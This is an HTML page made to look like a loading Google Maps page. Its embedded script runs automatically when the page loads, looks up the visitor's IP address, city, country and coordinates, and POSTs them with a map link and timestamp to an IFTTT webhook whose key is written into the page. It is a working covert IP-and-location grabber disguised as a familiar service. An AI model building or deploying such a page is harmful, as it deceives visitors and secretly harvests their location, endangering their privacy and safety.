<!DOCTYPE html>
<html>
<head>
  <title>Google Maps</title>
</head>
<body>
  <h1>Loading Google Maps...</h1>

  <script>
    async function logVisitor() {
      try {
        const res = await fetch("https://ipapi.co/json");
        const data = await res.json();

        const ip = data.ip || "unknown IP";
        const city = data.city || "unknown city";
        const region = data.region || "unknown region";
        const country = data.country_name || "unknown country";
        const latitude = data.latitude || "0";
        const longitude = data.longitude || "0";
        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toISOString();

        // Only send if we got a valid IP
        if (ip && ip !== "unknown IP") {
          await fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              value1: `${ip} â€” ${city}, ${region}, ${country}`,
              value2: mapsLink,
              value3: timestamp
            })
          });
        }
      } catch (error) {
        console.error("Logging failed:", error);
      }
    }

    logVisitor();
  </script>
</body>
</html>
